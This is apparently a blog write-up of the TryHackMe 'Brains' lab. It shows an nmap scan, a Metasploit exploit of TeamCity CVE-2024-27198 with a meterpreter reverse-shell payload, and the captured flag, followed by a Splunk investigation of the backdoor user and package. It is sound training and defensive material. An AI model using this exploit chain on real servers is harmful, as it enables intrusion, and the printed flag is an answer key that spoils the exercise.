---
title: "TryHackMe - Brains"
date: 2025-04-05 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [CVE-2024-27198, rce, jetbrains, metasploit, splunk, teamcity  ]

---
## Introduction

[This CTF](https://tryhackme.com/room/brains) is divided into two parts. In the first, we take on the role of an attacker compromising the server, while in the second, our task is to detect the intrusion as part of the blue team.

# Red: Exploit the Server ! 

## Reconnaissance

The initial phase of any reconnaissance involves conducting an Nmap scan to collect details about the target system. To achieve this, I executed the following command:

```console
$ nmap -sC -sV -A 10.10.247.49 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 13:23 EDT
Nmap scan report for 10.10.247.49
Host is up (0.075s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7f:73:d3:f6:1b:d2:a7:c2:2a:9b:02:99:4e:20:f3:c5 (RSA)
|   256 db:0a:4e:4b:11:b8:72:53:8a:d9:f2:f7:7f:fc:93:ff (ECDSA)
|_  256 8a:4a:06:11:8c:f9:a3:85:e2:a3:e2:ea:39:b1:83:2b (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
50000/tcp open  http    Apache Tomcat (language: en)
|_http-title: TeamCity Maintenance &mdash; TeamCity
| http-methods: 
|_  Potentially risky methods: TRACE
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
I notice an open port 50000, which takes me to the TeamCity login page. Immediately, the version 2023.11.3 in use catches my eye.

![jetbrainversion](/images/brains/brainsteamcityversion.png)

I searched the internet to check if there were any exploits related to this version of JetBrains TeamCity and found the vulnerability [CVE-2024-27198](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)

## Exploitation
I launch Metasploit.

```console
msf6 > search jetbrains

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  auxiliary/scanner/teamcity/teamcity_login                 .                normal     No     JetBrains TeamCity Login Scanner
   1  exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793  2023-09-19       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
   2    \_ target: Windows                                      .                .          .      .
   3    \_ target: Linux                                        .                .          .      .
   4  exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198  2024-03-04       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
   5    \_ target: Java                                         .                .          .      .
   6    \_ target: Java Server Page                             .                .          .      .
   7    \_ target: Windows Command                              .                .          .      .
   8    \_ target: Linux Command                                .                .          .      .
   9    \_ target: Unix Command                                 .                .          .      .

```

I select the exploit that interests me and configure it accordingly.

```console
msf6 > use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > show options
```

I then run the exploit. Everything goes according to plan. With access now gained, I begin searching for the first flag.

```console
cd /home
ls
ubuntu
cd ubuntu
ls
config.log
flag.txt
cat flag.txt
THM{faa9bac345709b6620a6200b484c7594}

```

**FLAG : THM{faa9bac345709b6620a6200b484c7594}**

# Blue: Let's Investigate
"The IT department has provided us one of the servers which was compromised as a result of the attack. Our task as a Forensics Analyst is to examine the host and identify the attacker's footprints in the post-exploitation stage."
## Investigation

**1. What is the name of the backdoor user which was created on the server after exploitation?**

To identify a newly created user account that may have been added post-exploitation, I begin by narrowing the scope of my search to specific parameters.
The first step is to set the **index to auth_logs**, as it directly relates to authentication activity.

![splunka](/images/brains/brainssplunka.png)

Next, I refine the search by filtering on key fields relevant to user authentication and system access events.

![splunkb](/images/brains/brainssplunkb.jpg)

Using this approach, and by focusing on the **name** field, I quickly identify a suspicious user with a conspicuous and alarming username: **eviluser**.

![eviluser](/images/brains/brainsquestion1.png)


**2. What is the name of the malicious-looking package installed on the server?**

I need to search the file **/var/log/dpkg.log**, which is the package management log used on Debian-based systems (e.g., Ubuntu, Kali Linux). This log is generated by the **dpkg tool**, which is responsible for installing, removing, and managing .deb packages.

The package was likely installed immediately after the user account was created, so I set a time range during which this could have occurred. I then proceed to search for the installed packages in **dpkg.log** within that timeframe.
![package](/images/brains/brainsquestion2.png)

As seen, the installed package is **datacollector**

**3. What is the name of the plugin installed on the server after successful exploitation?**

Having previously executed the exploit as a red team, I know that the vulnerability I exploited relates to **TeamCity**. I now begin searching through the TeamCity logs. Immediately, an unusual package name catches my eye.

![plugin](/images/brains/brainsquestion3.png)